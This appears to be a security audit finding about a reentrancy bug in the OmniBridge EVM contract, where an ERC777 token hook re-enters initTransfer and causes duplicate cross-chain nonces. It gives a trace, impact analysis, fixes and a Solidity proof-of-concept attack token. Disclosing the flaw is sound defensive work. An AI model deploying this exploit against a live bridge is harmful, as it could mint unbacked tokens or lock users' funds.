### Title
Reentrancy in `initTransfer` Causes Nonce Collision via ERC777 Token Callback — (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer` increments `currentOriginNonce` at the top of the function but then reads it **again** after external token-transfer calls when passing it to `initTransferExtension` and the `InitTransfer` event. No reentrancy guard exists anywhere in the EVM contracts. An unprivileged attacker using an ERC777-compatible token can re-enter `initTransfer` during the `tokensToSend` hook, causing two cross-chain messages to be published with the **same** `originNonce`, while one nonce is permanently skipped.

---

### Finding Description

`OmniBridge.initTransfer` follows this execution order:

1. **Line 381** — `currentOriginNonce += 1` (storage write, nonce becomes N)
2. **Lines 395–412** — external token transfer (`safeTransferFrom` / `burn`) — **external call, reentrancy window**
3. **Line 418** — `initTransferExtension(..., currentOriginNonce, ...)` — reads storage again
4. **Line 430** — `emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...)` — reads storage again [1](#0-0) [2](#0-1) [3](#0-2) 

No `nonReentrant` modifier or `ReentrancyGuardUpgradeable` is imported or applied anywhere in the EVM contract suite. [4](#0-3) 

ERC777 tokens implement the ERC20 interface and are therefore accepted by the plain-ERC20 branch of `initTransfer`. When `IERC20(tokenAddress).safeTransferFrom(msg.sender, address(this), amount)` is called, the ERC777 standard fires a `tokensToSend` hook on the sender's registered operator/implementer **before** the balance moves. An attacker who controls that hook can call `initTransfer` again from within it.

**Reentrancy trace:**

```
Attacker → initTransfer(ERC777token, amount=A, ...)
  currentOriginNonce → N
  safeTransferFrom → ERC777.transferFrom → tokensToSend hook fires
    Attacker → initTransfer(ERC777token, amount=B, ...)   ← re-entrant
      currentOriginNonce → N+1
      safeTransferFrom (no hook this time, or attacker suppresses it)
      initTransferExtension(..., nonce=N+1, ...)  ← Wormhole msg #1 with nonce N+1
      emit InitTransfer(..., nonce=N+1, ...)
    ← re-entrant call returns
  safeTransferFrom completes
  initTransferExtension(..., nonce=N+1, ...)  ← Wormhole msg #2 with nonce N+1 !!
  emit InitTransfer(..., nonce=N+1, ...)      ← duplicate event
```

`currentOriginNonce` is a single storage slot read at steps 3 and 4 **after** the re-entrant call has already advanced it to N+1. The outer call therefore uses N+1 for both its Wormhole message and its event, while nonce N is never published. [5](#0-4) 

In `OmniBridgeWormhole`, `initTransferExtension` calls `_wormhole.publishMessage` with the corrupted nonce, so two distinct Wormhole VAAs are emitted carrying `originNonce = N+1`. [6](#0-5) 

---

### Impact Explanation

The `originNonce` is the cross-chain uniqueness key for a transfer. Two Wormhole messages with the same `originNonce` N+1 produce one of two outcomes on the NEAR side:

- **Double-credit / unbacked supply**: If the NEAR bridge does not deduplicate by `originNonce`, both messages are finalized and the recipient (or attacker) receives tokens for both transfers while only one set of tokens was locked on EVM. This directly creates unbacked wrapped supply.
- **Permanent fund lock**: If the NEAR bridge deduplicates, the second N+1 message is rejected. The outer call's tokens (amount A) are locked in the bridge with no valid nonce to claim against — an irreversible fund lock for the victim.

Nonce N is permanently skipped, so any legitimate transfer that was assigned N is also unclaimable.

This matches the allowed High impact: *"Replayable, non-unique, or duplicate cross-chain settlement across proof, event, nonce, message, or finalization domains that produces double-credit or unbacked supply."*

---

### Likelihood Explanation

- The attacker is fully unprivileged; the only requirement is deploying or controlling an ERC777 token (a standard, widely deployed token type).
- The `initTransfer` function accepts **any** ERC20-compatible token address; there is no whitelist for the plain-ERC20 branch.
- The attack requires two `initTransfer` calls worth of token balance, which the attacker supplies themselves.
- No privileged role, leaked key, or external oracle compromise is needed.

---

### Recommendation

1. **Add `nonReentrant`** from `ReentrancyGuardUpgradeable` to `initTransfer`, `initTransfer1155`, and `finTransfer`.
2. **Capture the nonce in a local variable** immediately after incrementing it and use only that local variable for the rest of the function, eliminating the re-read of storage:

```solidity
function initTransfer(...) external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 nonce = currentOriginNonce;   // ← capture once
    ...
    // external calls
    ...
    initTransferExtension(msg.sender, tokenAddress, nonce, ...);
    emit BridgeTypes.InitTransfer(msg.sender, tokenAddress, nonce, ...);
}
```

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";

contract AttackToken is ERC777 {
    address public bridge;
    bool public attacking;

    constructor(address _bridge) ERC777("Atk","ATK", new address[](0)) {
        bridge = _bridge;
        _mint(msg.sender, 1_000_000e18, "", "");
    }

    // ERC777 hook: fires before balance moves on transferFrom
    function _beforeTokenTransfer(address, address from, address, uint256) internal override {
        if (from == address(this) || attacking) return;
        attacking = true;
        // Re-enter initTransfer with a second amount
        IOmniBridge(bridge).initTransfer(
            address(this), 1e18, 0, 0, "attacker.near", ""
        );
        attacking = false;
    }
}

// Steps:
// 1. Deploy AttackToken, approve bridge for 2e18
// 2. Call bridge.initTransfer(attackToken, 1e18, 0, 0, "victim.near", "")
//    → currentOriginNonce = N
//    → safeTransferFrom fires _beforeTokenTransfer
//      → re-entrant initTransfer: currentOriginNonce = N+1
//        → Wormhole VAA published: originNonce=N+1 (attacker's transfer)
//    → outer call resumes, reads currentOriginNonce=N+1
//      → Wormhole VAA published: originNonce=N+1 (victim's transfer, DUPLICATE)
// Result: two VAAs with originNonce=N+1; nonce N never published.
```

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L1-22)
```text
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.24;

import {AccessControlUpgradeable} from "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import {IERC165} from "@openzeppelin/contracts/utils/introspection/IERC165.sol";
import {ICustomMinter} from "../../common/ICustomMinter.sol";
import {IBridgeToken} from "../../common/IBridgeToken.sol";

import "./BridgeToken.sol";
import "./SelectivePausableUpgradable.sol";
import "../../common/Borsh.sol";
import "./BridgeTypes.sol";

```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L381-381)
```text
        currentOriginNonce += 1;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L407-412)
```text
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    address(this),
                    amount
                );
            }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L415-436)
```text
        initTransferExtension(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridgeWormhole.sol (L118-150)
```text
    function initTransferExtension(
        address sender,
        address tokenAddress,
        uint64 originNonce,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message,
        uint256 value
    ) internal override {
        bytes memory payload = bytes.concat(
            bytes1(uint8(MessageType.InitTransfer)),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(sender),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(tokenAddress),
            Borsh.encodeUint64(originNonce),
            Borsh.encodeUint128(amount),
            Borsh.encodeUint128(fee),
            Borsh.encodeUint128(nativeFee),
            Borsh.encodeString(recipient),
            Borsh.encodeString(message)
        );
        // slither-disable-next-line reentrancy-eth
        _wormhole.publishMessage{value: value}(
            wormholeNonce,
            payload,
            _consistencyLevel
        );

        wormholeNonce++;
    }
```
